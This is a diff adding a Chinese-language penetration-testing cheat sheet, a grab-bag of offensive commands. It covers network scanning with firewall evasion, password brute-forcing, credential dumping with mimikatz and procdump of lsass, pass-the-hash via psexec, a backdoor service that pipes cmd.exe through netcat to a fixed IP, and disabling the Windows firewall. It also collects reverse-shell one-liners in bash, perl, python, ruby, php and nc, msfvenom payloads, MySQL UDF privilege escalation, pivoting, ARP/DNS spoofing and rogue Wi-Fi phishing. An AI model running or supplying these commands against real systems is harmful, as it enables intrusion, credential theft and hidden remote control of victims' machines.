@@ -1,0 +1,921 @@
+nmap -v -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oX nmap_output.xml www.lijiejie.com/16
+-sn    不扫描端口，只ping主机
+-PE   通过ICMP echo判定主机是否存活
+-n     不反向解析IP地址到域名
+--min-hostgroup 1024    最小分组设置为1024个IP地址，当IP太多时，nmap需要分组，然后串行扫描
+--min-parallelism 1024  这个参数非常关键，为了充分利用系统和网络资源，我们将探针的数目限定最小为1024
+-oX nmap_output.xml    将结果以XML格式输出，文件名为nmap_output.xml
+一旦扫描结束，解析XML文档即可得到哪些IP地址是存活的。
+我测试扫描www.lijiejie.com/16这B段，65535个IP地址（存活10156），耗时112.03秒
+
+扫描内网IP
+nmap -sP 192.168.0.0/24
+扫描开放端口
+nmap 192.168.0.175
+sudo nmap -sS -T4 -A -p- 192.168.0.175
+-sS：半开扫描，记入系统日志风险小
+-sP：扫描端口前，先使用ping扫描，保证主机存活
+-A：全面系统检测，启用脚本检测和扫描
+
+https://www.freebuf.com/sectool/105524.html
+
+Nmap – 躲避防火墙
+# 分段
+$ nmap -f
+
+# 修改默认 MTU 大小，但必须为 8 的倍数(8,16,24,32 等等)
+$ nmap --mtu 24
+
+# 生成随机数量的欺骗
+$ nmap -D RND:10 [target]
+
+# 手动指定欺骗使用的 IP
+$ nmap -D decoy1,decoy2,decoy3 etc.
+
+# 僵尸网络扫描, 首先需要找到僵尸网络的IP
+$ nmap -sI [Zombie IP] [Target IP]
+
+# 指定源端口号
+$ nmap --source-port 80 IP
+
+# 在每个扫描数据包后追加随机数量的数据
+$ nmap --data-length 25 IP
+
+# MAC 地址欺骗，可以生成不同主机的 MAC 地址
+$ nmap --spoof-mac Dell/Apple/3Com IP
+
+
+http-passwd扫描
+nmap --script http-passwd --script-args http-passwd.root=/test/ IP地址
+curl http://localhost/../../../../../../../etc/passwd
+
+brew install arp-scan
+apt-get install arp-scan
+yum install arp-scan
+扫描网络所有设备
+arp-scan -I en0 -l
+arp-scan -l
+arp-scan -l -i 500 -D
+
+端口进行分析
+nc -nv 192.168.0.175 99
+
+目录扫描
+http://dirb.sourceforge.net/
+https://sourceforge.net/projects/dirb/files/latest/download
+https://nchc.dl.sourceforge.net/project/dirb/dirb/2.22/dirb222.tar.gz
+
+dirb 目标 字典路径
+dirb 目标 字典路径 -a "ua"  -c "cookie"
+dirb 目标 字典路径 -p ip:port -o result.txt
+dirb 目标 字典路径 -o result.txt
+dirb 目标 字典路径 -X test(这样每个被测试的字典都附加了test)
+dirb 目标 字典路径 -z 1000 (1秒)
+
+
+https://github.com/lanjelot/patator
+git clone https://github.com/lanjelot/patator.git
+# SMTP 爆破
+$ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst
+$ patator smtp_login host=192.168.17.129 user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
+$ patator smtp_login host=192.168.17.129 helo='ehlo 192.168.17.128' user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
+$ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst -x ignore:fgrep='incorrect password or account name'
+
+# http://ha.ckers.org/fierce/
+$ ./fierce.pl -dns example.com
+$ ./fierce.pl –dns example.com –wordlist myWordList.txt
+
+使用 Nikto 扫描 Web 服务
+nikto -C all -h http://IP
+
+扫描 WordPress
+git clone https://github.com/wpscanteam/wpscan.git && cd wpscan
+./wpscan –url http://IP/ –enumerate p
+
+HTTP 指纹识别
+wget http://www.net-square.com/_assets/httprint_linux_301.zip && unzip httprint_linux_301.zip
+cd httprint_301/linux/
+./httprint -h http://IP -s signatures.txt
+
+https://github.com/maurosoria/dirsearch
+
+Skipfish 是一款 Web 应用安全侦查工具，Skipfish 会利用递归爬虫和基于字典的探针生成一幅交互式网站地图，最终生成的地图会在通过安全检查后输出。
+skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP
+
+使用 NC 扫描
+nc -v -w 1 target -z 1-1000
+for i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done
+
+Unicornscan 是一个信息收集和安全审计的工具。
+http://www.unicornscan.org/
+us -H -msf -Iv 192.168.56.101 -p 1-65535
+us -H -mU -Iv 192.168.56.101 -p 1-65535
+-H 在生成报告阶段解析主机名
+-m 扫描类型 (sf - tcp, U - udp)
+-Iv - 详细
+
+使用 Xprobe2 识别操作系统指纹
+xprobe2 -v -p tcp:80:open IP
+
+枚举 Samba
+nmblookup -A target
+smbclient //MOUNT/share -I target -N
+rpcclient -U "" target
+enum4linux target
+
+枚举 SNMP
+snmpget -v 1 -c public IP
+snmpwalk -v 1 -c public IP
+snmpbulkwalk -v2c -c public -Cn0 -Cr10 IP
+
+实用的 Windows cmd 命令
+net localgroup Users
+net localgroup Administrators
+search dir/s *.doc
+system("start cmd.exe /k $cmd")
+sc create microsoft_update binpath="cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe" start= auto error= ignore
+/c C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779
+mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords"
+Procdump.exe -accepteula -ma lsass.exe lsass.dmp
+mimikatz.exe "sekurlsa::minidump lsass.dmp" "log" "sekurlsa::logonpasswords"
+C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp 32 位系统
+C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp 64 位系统
+
+PuTTY 连接隧道
+转发远程端口到目标地址
+plink.exe -P 22 -l root -pw "1234" -R 445:127.0.0.1:445 IP
+
+Meterpreter 端口转发
+# https://www.offensive-security.com/metasploit-unleashed/portfwd/
+# 转发远程端口到目标地址
+meterpreter > portfwd add –l 3389 –p 3389 –r 172.16.194.141
+kali > rdesktop 127.0.0.1:3389
+
+开启 RDP 服务
+reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
+netsh firewall set service remoteadmin enable
+netsh firewall set service remotedesktop enable
+
+关闭 Windows 防火墙
+netsh firewall set opmode disable
+
+Meterpreter VNC\RDP
+# https://www.offensive-security.com/metasploit-unleashed/enabling-remote-desktop/
+run getgui -u admin -p 1234
+run vnc -p 5043
+
+获取 Windows 明文用户名密码
+git clone https://github.com/gentilkiwi/mimikatz.git
+privilege::debug
+sekurlsa::logonPasswords full
+
+获取哈希值
+git clone https://github.com/byt3bl33d3r/pth-toolkit
+pth-winexe -U hash //IP cmd
+或者
+apt-get install freerdp-x11
+xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP
+在或者
+meterpreter > run post/windows/gather/hashdump
+Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
+msf > use exploit/windows/smb/psexec
+msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
+msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
+msf exploit(psexec) > exploit
+meterpreter > shell
+
+使用 Hashcat 破解密码
+hashcat -m 400 -a 0 hash /root/rockyou.txt
+
+使用 NC 抓取 Banner 信息
+nc 192.168.0.10 80
+
+使用 NC 在 Windows 上反弹 shell
+c:>nc -Lp 31337 -vv -e cmd.exe
+nc 192.168.0.10 31337
+c:>nc example.com 80 -e cmd.exe
+nc -lp 80
+nc -lp 31337 -e /bin/bash
+nc 192.168.0.10 31337
+nc -vv -r(random) -w(wait) 1 192.168.0.10 -z(i/o error) 1-1000
+
+查找 SUID\SGID root 文件
+# 查找 SUID root 文件
+find / -user root -perm -4000 -print
+
+# 查找 SGID root 文件:
+find / -group root -perm -2000 -print
+
+# 查找 SUID 和 SGID 文件:
+find / -perm -4000 -o -perm -2000 -print
+
+# 查找不属于任何用户的文件:
+find / -nouser -print
+
+# 查找不属于任何用户组的文件:
+find / -nogroup -print
+
+# 查找软连接及其指向:
+find / -type l -ls
+
+Python shell
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+Python\Ruby\PHP HTTP 服务器
+python2 -m SimpleHTTPServer
+python3 -m http.server
+ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 8888, :D
+ ocumentRoot => Dir.pwd).start"
+php -S 0.0.0.0:8888
+
+获取进程对应的 PID
+fuser -nv tcp 80
+fuser -k -n tcp 80
+
+使用 Hydra 爆破 RDP
+hydra -l admin -P /root/Desktop/passwords -S X.X.X.X rdp
+
+挂载远程 Windows 共享文件夹
+smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw
+
+SSH 穿透
+ssh -D 127.0.0.1:1080 -p 22 user@IP
+Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
+proxychains commands target
+
+SSH 穿透从一个网络到另一个网络
+ssh -D 127.0.0.1:1080 -p 22 user1@IP1
+Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
+proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2
+Add socks4 127.0.0.1 1081 in /etc/proxychains.conf
+proxychains commands target
+
+使用 metasploit 进行穿透
+route add X.X.X.X 255.255.255.0 1
+use auxiliary/server/socks4a
+run
+proxychains msfcli windows/* PAYLOAD=windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 RHOST=IP E
+
+或者
+
+# https://www.offensive-security.com/metasploit-unleashed/pivoting/
+meterpreter > ipconfig
+IP Address  : 10.1.13.3
+meterpreter > run autoroute -s 10.1.13.0/24
+meterpreter > run autoroute -p
+10.1.13.0          255.255.255.0      Session 1
+meterpreter > Ctrl+Z
+msf auxiliary(tcp) > use exploit/windows/smb/psexec
+msf exploit(psexec) > set RHOST 10.1.13.2
+msf exploit(psexec) > exploit
+meterpreter > ipconfig
+IP Address  : 10.1.13.2
+
+MSF Payloads
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> X > system.exe
+msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 R > exploit.php
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e -a x86 --platform win -f asp -o file.asp
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e x86/shikata_ga_nai -b "\x00" -a x86 --platform win -f c
+MSF 生成在 Linux 下反弹的 Meterpreter Shell
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e -f elf -a x86 --platform linux -o shell
+MSF 生成反弹 Shell (C Shellcode)
+msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b "\x00\x0a\x0d" -a x86 --platform win -f c
+MSF 生成反弹 Python Shell
+msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py
+MSF 生成反弹 ASP Shell
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp -a x86 --platform win -o shell.asp
+MSF 生成反弹 Bash Shell
+msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -o shell.sh
+MSF 生成反弹 PHP Shell
+msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -o shell.php
+add <?php at the beginning
+perl -i~ -0777pe's/^/<?php \n/' shell.php
+MSF 生成反弹 Win Shell
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe -a x86 --platform win -o shell.exe
+
+BASH 反弹 Shell
+bash -i >& /dev/tcp/X.X.X.X/443 0>&1
+
+exec /bin/bash 0&0 2>&0
+exec /bin/bash 0&0 2>&0
+
+0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196
+
+0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196
+
+exec 5<>/dev/tcp/attackerip/4444 cat <&5 | while read line; do $line 2>&5 >&5; done # or: while read line 0<&5; do $line 2>&5 >&5; done
+exec 5<>/dev/tcp/attackerip/4444
+
+cat <&5 | while read line; do $line 2>&5 >&5; done # or:
+while read line 0<&5; do $line 2>&5 >&5; done
+
+/bin/bash -i > /dev/tcp/attackerip/8080 0<&1 2>&1
+/bin/bash -i > /dev/tcp/X.X.X.X/443 0<&1 2>&1
+PERL 反弹 Shell
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:443");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
+# Win 平台
+perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};’
+RUBY 反弹 Shell
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+# Win 平台
+ruby -rsocket -e 'c=TCPSocket.new("attackerip","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+ruby -rsocket -e 'f=TCPSocket.open("attackerip","443").to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+PYTHON 反弹 Shell
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attackerip",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+PHP 反弹 Shell
+php -r '$sock=fsockopen("attackerip",443);exec("/bin/sh -i <&3 >&3 2>&3");'
+JAVA 反弹 Shell
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/attackerip/443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+NETCAT 反弹 Shell
+nc -e /bin/sh attackerip 4444
+nc -e /bin/sh 192.168.37.10 443
+
+# 如果 -e 参数被禁用，可以尝试以下命令
+# mknod backpipe p && nc attackerip 443 0<backpipe | /bin/bash 1>backpipe
+/bin/sh | nc attackerip 443
+rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4443 0/tmp/
+
+# 如果你安装错了 netcat 的版本，请尝试以下命令
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attackerip >/tmp/f
+TELNET 反弹 Shell
+# 如果 netcat 不可用或者 /dev/tcp
+mknod backpipe p && telnet attackerip 443 0<backpipe | /bin/bash 1>backpipe
+XTERM 反弹 Shell
+# http://baike.baidu.com/view/418628.htm
+# 开启 X 服务器 (:1 – 监听 TCP 端口 6001)
+apt-get install xnest
+Xnest :1
+
+# 记得授权来自目标 IP 的连接
+xterm -display 127.0.0.1:1
+
+# 授权访问
+xhost +targetip
+
+# 在目标机器上连接回我们的 X 服务器
+xterm -display attackerip:1
+/usr/openwin/bin/xterm -display attackerip:1
+or
+$ DISPLAY=attackerip:0 xterm
+
+SSH Over SCTP (使用 Socat)
+# 远端服务器
+# 假设你准备让 SCTP socket 监听端口 80/SCTP 并且 sshd 端口在 22/TCP
+$ socat SCTP-LISTEN:80,fork TCP:localhost:22
+
+# 本地端
+# 将 SERVER_IP 换成远端服务器的地址，然后将 80 换成 SCTP 监听的端口号
+$ socat TCP-LISTEN:1337,fork SCTP:SERVER_IP:80
+
+# 创建 socks 代理
+# 替换 username 和 -p 的端口号
+$ ssh -lusername localhost -D 8080 -p 1337
+
+使用洋葱网络
+
+# 安装服务
+$ apt-get install tor torsocks
+
+# 绑定 ssh 到 tor 服务端口 80
+# /etc/tor/torrc
+SocksPolicy accept 127.0.0.1
+SocksPolicy accept 192.168.0.0/16
+Log notice file /var/log/tor/notices.log
+RunAsDaemon 1
+HiddenServiceDir /var/lib/tor/ssh_hidden_service/
+HiddenServicePort 80 127.0.0.1:22
+PublishServerDescriptor 0
+$ /etc/init.d/tor start
+$ cat /var/lib/tor/ssh_hidden_service/hostname
+3l5zstvt1zk5jhl662.onion
+
+# ssh 客户端连接
+$ apt-get install torsocks
+$ torsocks ssh login@3l5zstvt1zk5jhl662.onion -p 80
+
+通过 MySQL Root 账户实现提权
+# Mysql Server version: 5.5.44-0ubuntu0.14.04.1 (Ubuntu)
+$ wget 0xdeadbeef.info/exploits/raptor_udf2.c
+$ gcc -g -c raptor_udf2.c
+$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+mysql -u root -p
+mysql> use mysql;
+mysql> create table foo(line blob);
+mysql> insert into foo values(load_file('/home/user/raptor_udf2.so'));
+mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+mysql> create function do_system returns integer soname 'raptor_udf2.so';
+mysql> select * from mysql.func;
+mysql> select do_system('echo "root:passwd" | chpasswd > /tmp/out; chown user:user /tmp/out');
+user:~$ su -
+Password:
+user:~# whoami
+root
+root:~# id
+uid=0(root) gid=0(root) groups=0(root)
+
+使用 LD_PRELOAD 注入程序
+$ wget https://github.com/jivoi/pentest/ldpreload_shell.c
+$ gcc -shared -fPIC ldpreload_shell.c -o ldpreload_shell.so
+$ sudo -u user LD_PRELOAD=/tmp/ldpreload_shell.so /usr/local/bin/somesoft
+
+osueta 是一个用于对 OpenSSH 进行时序攻击的 python2 脚本，其可以利用时序攻击枚举 OpenSSH 用户名，并在一定条件下可以对 OpenSSH 服务器进行 DOS 攻击。
+# https://github.com/c0r3dump3d/osueta
+$ ./osueta.py -H 192.168.1.6 -p 22 -U root -d 30 -v yes
+$ ./osueta.py -H 192.168.10.22 -p 22 -d 15 -v yes –dos no -L userfile.txt
+
+使用 ReDuh 构造合法的 HTTP 请求以建立 TCP 通道
+注： ReDuh 是一个通过 HTTP 协议建立隧道传输各种其他数据的工具。其可以把内网服务器的端口通过 http/https 隧道转发到本机，形成一个连通回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口。
+
+对了亲～ReDuh-Gui 号称端口转发神器哦。
+
+# https://github.com/sensepost/reDuh
+
+# 步骤 1
+# 上传 reDuh.jsp 目标服务器
+$ http://192.168.10.50/uploads/reDuh.jsp
+
+# 步骤 2
+# 在本机运行 reDuhClient
+$ java -jar reDuhClient.jar http://192.168.10.50/uploads/reDuh.jsp
+
+# 步骤 3
+# 使用 nc 连接管理端口
+$ nc -nvv 127.0.0.1 1010
+
+# 步骤 4
+# 使用隧道转发本地端口到远程目标端口
+[createTunnel] 7777:172.16.0.4:3389
+
+# 步骤 5
+# 使用 RDP 连接远程
+$ /usr/bin/rdesktop -g 1024x768 -P -z -x l -k en-us -r sound:off localhost:7777
+
+https://www.freebuf.com/sectool/105524.html
+
+wwwscan
+wwwscan是一款网站后台扫描工具，简单好用又强大。它有命令行和图形界面两种。
+
+使用方法也很简单,下面讲一下命令行的用法。
+
+wwwscan.exe options ip/域名
+
+-p	：设置端口号
+-m	：设置最大线程数
+-t	：设置超时时间
+-r	：设置扫描的起始目录
+-ssl：是否使用SSL
+例：
+
+wwwscan.exe  www.baidu.com -p 8080 -m 10 -t 16
+wwwscan.exe  www.baiadu.com -r "/test/" -p 80
+wwwscan.exe  www.baidu.com –ssl
+
+御剑
+dirbuster
+
+cansina
+Cansina是用python写的一款探测网站的敏感目录和内容的安全测试工具，其具有如下特点：
+
+多线程
+HTTP/S 代理支持
+数据持久性 (sqlite3)
+多后缀支持 (-e php,asp,aspx,txt…)
+网页内容识别 (will watch for a specific string inside web page content)
+跳过假404错误
+可跳过被过滤的内容
+报表功能
+基础认证
+常见参数及用法
+-u：目标url地址
+-p：指定字典文件
+-b：禁止的响应代码如果 404 400 500
+-e：只扫php或asp或aspx扩展。
+-c：在网页中查找一些关键字。也可以添加多个关键字。
+-d：就是查看文件中是否有要找的字符，如果没有将自动返回404特征码。
+-D：自动检查并返回特定的404 200等
+
+git clone --depth=1 https://github.com/deibit/cansina
+cd cansina
+pip install -r requirements.txt
+
+常规扫描：python  cansina.py  -u  www.baidu.com  -p  key.txt
+
+自定义文件类型扫描：python cansina.py  -u  www.baidu.com  -p  key.txt  -e  php
+
+特定内容扫描：python cansina.py  -u  www.baidu.com  -p  key.txt  -c  admin
+
+dirmap一个高级web目录、文件扫描工具，功能将会强于DirBuster、Dirsearch、cansina、御剑。
+git clone https://github.com/H4ckForJob/dirmap.git && cd dirmap && python3 -m pip install -r requirement.txt
+单目标，默认为http
+python3 dirmap.py -i https://target.com -lcf
+python3 dirmap.py -i 192.168.1.1 -lcf
+子网（CIDR格式）
+python3 dirmap.py -i 192.168.1.0/24 -lcf
+网络范围
+python3 dirmap.py -i 192.168.1.1-192.168.1.100 -lcf
+文件读取
+python3 dirmap.py -iF targets.txt -lcf
+
+sqlmap
+git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
+python sqlmap.py -h
+
+
+渗透测试插件化并发框架
+git clone https://github.com/Xyntax/POC-T
+pip install -r requirement.txt
+python POC-T.py
+脚本	说明
+activemq-upload.py	ActiveMQ 文件上传
+activemq-weakpass.py	ActiveMQ 弱口令
+confluence-traversal.py	Atlassian Confluence 文件读取
+fastcgi-rce.py	PHP FastCGI 文件读取/RCE
+phpcms9.6.0-getshell.py	PHPCMS 9.6.0 member/index.php 文件上传Getshell
+phpcms9.6.0-sqli.py	PHPCMS 9.6.0 down.php 前台注入
+fiyo2.0.7-getshell.py	FiyoCMS 文件上传GetShell
+glassfish-traversal.py	GlassFish 任意文件读取
+jboss-rce.py	JBoss 命令执行 (jexboss去后门版)
+jetspeed-rest-unauth.py	Apache Jetspeed REST API未授权访问
+joomla-registrationpro-sqli.py	Joomla registrationpro组件SQL注入
+joomla-videoflow-sqli.py	Joomla videoflow组件SQL注入
+joomla-videogallerylite-sqli.py	Joomla Huge-IT videogallerylite 组件注入
+kubernetes-unauth	Kubernetes API 未授权访问(作者:Oritz)
+maccms8-rce.py	MACCMS(苹果CMS) vod-search 组件代码执行 (作者:potapo)
+memcached-unauth.py	Memcached 未授权访问
+metinfo-504-sqli.py	MetInfo 5.0.4 id参数SQL注入
+mongodb-unauth.py	MongoDB 未授权访问 (作者:Double8)
+navis-webaccess-sqli.py	Navis WebAccess SQL注入
+opensshd-user-enum.py	Opensshd 用户猜解
+phpmyadmin-auth-rce.py	phpMyAdmin 登入后命令执行
+redis-unauth.py	Redis 未授权访问
+redis-cron-getshell.py	Redis利用之 cron.d
+redis-sshkey-getshell.py	Redis利用之 ssh-key
+redis-web-probe.py	Redis利用之 webshell
+resindoc-traversal.py	resin-doc 文件读取/SSRF
+samsoftech-admin-bypass.py	SAM Softech后台登录绕过
+shiro-deserial-rce.py	Apache Shiro 反序列化命令执行
+siemens-camera-getpwd.py	SIEMENS IP-Camrea 密码泄露
+solr-unauth.py	Apache Solr 未授权访问
+struts2-devmode.py	Struts2 devMode 命令执行
+struts2-s2032.py	Struts2 S2-032 命令执行
+struts2-s2045.py	Struts2 S2-045 命令执行 (作者:24'')
+vbulletin-ssrf.py	vBulletin SSRF
+weblogic-wls.py	WebLogic Server WLS RCE (Author:starnight_cyber)
+wp-4.4-ssrf.py	WordPress 4.4 SSRF
+wp-4.7-userinfo.py	WordPress 4.7 REST API信息泄露
+wp-4.7.1-restapi.py	WordPress 4.7.1 REST API内容注入
+wp-bonkersbeat-filedownload.py	WordPress bonkersbeat theme 任意文件下载
+wp-forcedownload.py	WordPress forcedownload 任意文件下载
+wp-ypo-filedownload.py	WordPress ypo theme 任意文件下载
+zabbix-jsrpc-mysql-exp.py	Zabbix jsrpc.php MySQL注入利用 (作者:B0t0w1)
+zabbix-jsrpc-sqli.py	Zabbix jsrpc.php SQL注入检测
+zonetransfer.py	DNS域传送漏洞
+爆破&扫描
+脚本	说明
+brute-example.py	表单爆破示例(51idc某站)
+rsync-weakpass.py	rsync 弱口令爆破
+zabbix-weakpass.py	zabbix 弱口令爆破
+weblogic-ssrf-netmap	利用SSRF漏洞扫描内网端口(nmap 1000 ports)
+爬虫&采集
+脚本	说明
+spider-example.py	爬虫示例(B站用户签名档爬虫)
+其他
+脚本	说明
+vote-example.py	给基友开发的刷票脚本
+bingc.py	基于Bing搜索引擎的C段/旁站扫描(支持Bing-API)
+check-cdn.py	探测网站是否使用CDN/云WAF(多节点Get)
+
+git clone https://github.com/saucer-man/saucerframe.git
+cd saucerframe
+pip install -r requirement.txt
+python3 saucerframe.py -h
+python3 saucerframe.py --show
+python3 saucerframe.py -s script-name -iU target-url
+具体的参数说明：
+# 1. 指定poc脚本(必需,支持同时指定多个poc)
+-s redis_unauth,mongodb_unauth
+# 2. 指定目标(必需)
+-iU www.xxx.com  单个目标
+-iF target.txt  从文本中加载
+-iR 192.168.1.1-192.168.2.100  根据ip地址范围加载
+-iN 192.168.1.0/24  根据网段加载
+-aZ "redis"  ZoomEye api加载
+-aS "redis"  Shodan api加载
+-aC "redis"  Censys api加载
+-aF "redis"  Fofa api加载
+# 3. 其他(可选)
+-h  查看帮助信息
+-t 300  并发数(默认100)
+--proxy socks5://127.0.0.1:1080  使用sock5代理
+-o result.txt  指定输出文件
+-v 4 指定终端输出详细级别(1-5, 默认为2)
+--show  查看所有poc
+-eT  并发采用多线程方式
+-eG  并发采用协程方式(默认)
+支持多种api批量获取目标:
+https://www.shodan.io/
+https://www.zoomeye.org/
+https://fofa.so/
+https://censys.io/
+thinkphp_rce.py	saucerman	2018-12-11	ThinkPHP(5.x < 5.1.31 / <= 5.0.23)远程命令执行检测
+source_leak_check.py	saucerman	2018-12-14	敏感信息泄露检测
+weblogic_ssrf.py	saucerman	2019-02-25	weblogic SSRF漏洞(CVE-2014-4210)
+weblogic_weak_pass.py	saucerman	2019-02-25	weblogic 弱口令漏洞
+weblogic_xmldecoder_exec.py	saucerman	2019-02-25	weblogic XMLdecoder反序列化漏洞(CVE-2017-10271)
+weblogic_2019_48814.py	saucerman	2019-04-26	CNVD-C-2019-48814 Weblogic wls9_async_response 反序列化RCE
+wp_social_warfare_rce.py	saucerman	2019-05-11	wordpress plugin Social Warfare <= 3.5.2 - Unauthenticated Remote Code Execution (RCE)
+coremail_source_leak.py	saucerman	2019-06-16	coremail系统信息泄露
+fastadmin_weak.py	ziqiang.zhang	2019-06-25	fastadmin弱口令
+csbrute.py	saucerman	2019-09-29	Cobalt Strike口令爆破
+discuz_rce.py	saucerman	2019-09-29	Discuz ML! V3.X 代码注入
+fw_oa_rce.py	saucerman	2019-09-29	泛微OA E-cology 远程代码执行漏洞 CNVD-2019-32204
+mongodb_unauth.py	saucerman	2019-09-29	mongodb未授权访问
+redis_unauth.py	saucerman	2019-09-29	redis未授权访问
+seeyon.py	saucerman	2019-09-29	致远oa rce
+unauth.py	saucerman	2019-09-29	常见未授权访问一把梭
+phpstudy_backdoor.py	B1ain	2019-09-29	phpstudy 后门漏洞验证
+
+https://github.com/zerokeeper/WebEye
+https://github.com/boy-hack/gwhatweb
+https://github.com/w-digital-scanner/w11scan
+https://github.com/w-digital-scanner/w13scan
+git clone https://github.com/w-digital-scanner/w13scan.git
+cd w13scan # 进入git目录
+pip3 install -r requirements.txt
+cd W13SCAN # 进入源码目录
+python3 w13scan.py -h
+python3 w13scan.py -s 127.0.0.1:7778 --html # 端口可省略，默认为7778,开启--html即实时生成html报告
+
+https://github.com/vulhub/vulhub
+漏洞靶场环境
+
+git clone https://github.com/maurosoria/dirsearch.git
+cd dirsearch
+python3 dirsearch.py -u <URL> -e <EXTENSION>
+docker build -t "dirsearch:v0.3.8" .
+docker run -it --rm "dirsearch:v0.3.8" -u target -e php,html,png,js,jpg
+
+git clone https://github.com/ring04h/weakfilescan
+python wyspider.py http://wuyun.org php
+yum install python-devel libxml2-devel libxslt-devel
+pip install lxml beautifulsoup4
+
+git clone https://github.com/Xyntax/FileSensor
+cd FileSensor
+pip3 install -r requirement.txt
+
+
+git clone https://github.com/lijiejie/BBScan
+python BBScan.py --scripts-only --script redis_unauthorized_access --host www.site.com --network 16
+python BBScan.py --no-scripts --rule git_and_svn --no-check404 --no-crawl -f iqiyi.txt
+python BBScan.py --scripts-only --script port_scan --host www.baidu.com --network 16 --save-ports ports_80.txt
+
+git clone https://github.com/sullo/nikto.git
+cd nikto
+docker build -t sullo/nikto .
+docker run --rm sullo/nikto
+docker run --rm sullo/nikto -h http://www.example.com
+docker run --rm -v $(pwd):/tmp sullo/nikto -h http://www.example.com -o /tmp/out.json
+
+git clone https://github.com/spinkham/skipfish
+skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP
+
+ettercap 局域网嗅探(ARP地址欺骗)
+https://blog.csdn.net/qq_38228830/article/details/81989301
+https://www.cnblogs.com/lvchenfeng/p/5596572.html
+ettercap -Tq -i eth0 -M arp:remote /192.168.43.10// /192.168.43.1//
+vim /etc/ettercap/etter.dns
+www.baidu.com      A       192.168.43.133
+*.*.*                         A        192.168.43.133
+
+https://github.com/chrisk44/Hijacker
+https://github.com/aircrack-ng/aircrack-ng
+
+git clone https://github.com/wifiphisher/wifiphisher
+cd wifiphisher
+sudo python setup.py install
+扫描附近的WI-FI
+wifiphisher
+输入num
+https://www.qxzxp.com/6406.html
+wifiphisher -aI wlan0 -jI wlan4 -p firmware-upgrade --handshake-capture handshake.pcap
+wifiphisher --essid CONFERENCE_WIFI -p plugin_update -pK s3cr3tp4ssw0rd
+wifiphisher --essid "FREE WI-FI" -p oauth-login -kB
+
+
+https://github.com/Jermic/Android-Crack-Tool
